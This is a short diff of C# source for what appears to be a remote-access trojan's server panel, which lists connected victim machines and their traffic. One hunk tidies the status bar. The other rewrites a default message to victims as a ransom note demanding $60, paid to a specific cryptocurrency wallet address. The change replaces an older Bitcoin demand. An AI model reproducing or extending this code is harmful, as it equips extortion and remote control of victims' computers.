@@ -282,9 +282,9 @@ namespace Server
 
         private void UpdateUI_Tick(object sender, EventArgs e)
         {
-            Text = $"{Settings.Version}     {DateTime.Now.ToLongTimeString()}";
+            Text = $"{Settings.Version}";
             lock (Settings.LockListviewClients)
-                toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.SentValue).ToString()}     Received  {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     Memory {(int)performanceCounter2.NextValue()}%";
+                toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()} | Selected {listView1.SelectedItems.Count.ToString()} | Sent {Methods.BytesToString(Settings.SentValue).ToString()} | Received {Methods.BytesToString(Settings.ReceivedValue).ToString()}";
         }
 
         #endregion
@@ -1429,7 +1429,7 @@ namespace Server
         {
             try
             {
-                string Msgbox = Interaction.InputBox("Message", "Message", "All your files have been encrypted. pay us 0.2 BITCOIN. Our address is 1234567890");
+                string Msgbox = Interaction.InputBox("Message", "Message", "All your files have been encrypted. pay us 60$. Our address is 0x9563095feba9697c301adf2e8676daf80e8ca169");
                 if (string.IsNullOrEmpty(Msgbox))
                     return;
                 else
